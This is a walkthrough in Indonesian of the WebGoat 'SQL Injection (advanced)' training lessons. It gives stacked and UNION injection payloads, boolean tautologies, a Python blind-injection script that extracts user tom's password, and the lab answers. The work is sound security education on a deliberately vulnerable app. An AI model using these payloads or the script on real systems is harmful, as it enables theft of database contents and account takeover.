# SQL Injection (advanced)
## Try It! Pulling data from other tables
- Masukkan query injection sebagai berikut lalu tekan tombol **Get Account Info**
```sh
'; select * from user_system_data; --
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%201.JPG)

- Setelah data tampil, kita dapat menemukan password user dave

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%202.JPG)

- Masukkan password user dave ke field Password dan tekan tombol **Check Password**
```sh
passW0rD
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%204.JPG)

- Selain query injection diatas, kita juga bisa memasukkan query sebagai berikut
```sh
' union select userid, user_name, password, cookie, null as c1, null as c2, null as c3 from user_system_data; --
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%205.JPG)

## Can you log in as Tom?

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%206.JPG)

- Berdasarkan petunjuk soal, celah keamanan berada di field `Username` pada form **REGISTER**

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%207.JPG)

- Pertama-tama kita nyalakan tool Burp Suite, kemudian kita coba masukkan payload sql injection pada field `Username` dan untuk field lainnya bisa diisi secara bebas seperti contoh berikut ini

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%208.JPG)

- Jika sudah klik tombol **Register Now** maka akan muncul pesan bahwa `User ' or 1=1;-- sudah ada` jadi kita harus menggantinya dengan username lain
```sh
' or 1=1;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%209.JPG)

- Kemudian kita coba ganti username dengan payload sql injection lainnya seperti dibawah ini
```sh
' or 1!=1;--
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2010.JPG)

- Setelah kita klik tombol **Register Now** muncul pesan bahwa `User ' or 1!=1;-- berhasil dibuat` jadi kita bisa melakukan login. Dari sini dapat disimpulkan bahwa jika query pengecekan username bernilai `true` maka muncul pesan bahwa user sudah ada, sedangkan jika query pengecekan username bernilai `false` maka user akan ditambahkan ke database. Jadi kita bisa manfaatkan celah ini untuk mengetahui password user tom melalui serangkain sql injection

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2011.JPG)

- Pada tool Burp Suite terdeteksi endpoint `/WebGoat/SqlInjectionAdvanced/challenge` yang digunakan untuk melakukan register user baru

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2012.JPG)

- Payload yang kita gunakan untuk mengetahui password user tom adalah sebagai berikut
```sh
tom' and substring(password, 1, 1)='a
```
- Berikut ini adalah source code python yang kita gunakan mengoptimalisasi proses sql injection diatas. Simpan script dibawah ini dengan nama `pass_tom.py`
```sh
import requests

url = 'http://IP_Server:8080' #ubah url sesuai url server anda

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': url+'/WebGoat/start.mvc?username=testing',
    'Origin': url,
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Cookie': 'JSESSIONID=xxx' #ubah nilai JSESSIONID sesuai nilai JSESSIONID yang muncul di Burp Suite anda
}

password=""
for length in range(1,25):
     for letter in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890":
          params = "username_reg=tom'+AND+substring(password%2C1%2C"+str(length)+")%3D'"+password+letter+"&email_reg=test%40example.com&password_reg=a&confirm_password_reg=a"
          request = requests.put(url+"/WebGoat/SqlInjectionAdvanced/challenge", headers=headers, data=params)
          if "already exists" in request.text:
               password += letter
               print("Progress : "+password)
               break

print(f"\n")     
print("Password yang ditemukan: "+password)
```
- Jalankan script python diatas di terminal
```sh
python3 pass_tom.py
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2013.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2014.JPG)

- Setelah program diatas dijalankan, kita berhasil mendapatkan password dari user tom. Sekarang kita tinggal lakukan login di form login
```sh
thisisasecretfortomonly
```

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2015.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/sql%20injection%20advanced/sqli%20advanced%2016.JPG)